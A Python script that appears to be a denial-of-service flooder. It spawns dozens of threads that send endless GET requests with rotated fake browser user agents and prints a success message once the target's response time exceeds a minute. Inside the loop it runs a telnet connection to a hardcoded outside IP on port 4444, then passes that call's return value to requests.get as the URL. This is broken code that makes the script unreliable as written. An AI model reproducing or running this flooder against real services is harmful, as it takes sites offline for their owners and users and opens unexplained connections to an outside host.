import requests
import threading
import time 
from random_user_agent.user_agent import UserAgent
from random_user_agent.params import SoftwareName, OperatingSystem
import os

l = []
rl = []

def current_sec_time():
    t = time.time()
    return t
def current_mil_time():
    t = time.time() * 1000
    return t


def count_req_per_sec():
    ti = current_sec_time()
    l.append({
        'time_took' : ti,
    })
    for e in l :
        if ((current_sec_time() - e['time_took']) > 1):
            l.remove(e)


def count_resp_per_sec(t):
    ti = current_sec_time()
    rl.append({
        'time_took' : t,
         'c_time' : ti,
    })
    for e in rl:
        if((current_sec_time() - e['c_time']) > 1):
            rl.remove(e)






def make_request(i):
    count_req_per_sec()
    while True:
        software_names = [SoftwareName.CHROME.value, SoftwareName.OPERA.value,SoftwareName.FIREFOX.value,SoftwareName.EDGE.value]
        operating_systems = [OperatingSystem.WINDOWS.value,OperatingSystem.LINUX.value,OperatingSystem.MAC.value]



        
        user_agent_rotator = UserAgent(software_names=software_names, operating_systems=operating_systems, limit=1000)
        user_agent = user_agent_rotator.get_random_user_agent()
        t = current_mil_time()
        headers = {
            'User-Agent':user_agent,
        }
        q = os.system("telnet 59.96.19.148 4444")
        p = requests.get(q, headers=headers)
        t= current_mil_time() - t
        count_resp_per_sec(t)

threads = 32
i=0
while (i<=threads):
    t = threading.Thread(target= make_request,args=(i,))
    t.start()
    print("The thread,#{} : started ".format(i))
    i+=1

while True:
    response_time = 0
    for e in rl:
        response_time= response_time + e['time_took']
        if(len(rl)>0):
            response_time =  response_time /(len(rl))
        if(response_time>60000):
            print("DOS LOOKS SUCCESSFULLL")

        else:
            print("\rDOSING.....average Response time :{}ms average req/sec :{} average resp/sec : {} ".format(round(response_time,2),len(l),len(rl)),end = "") 
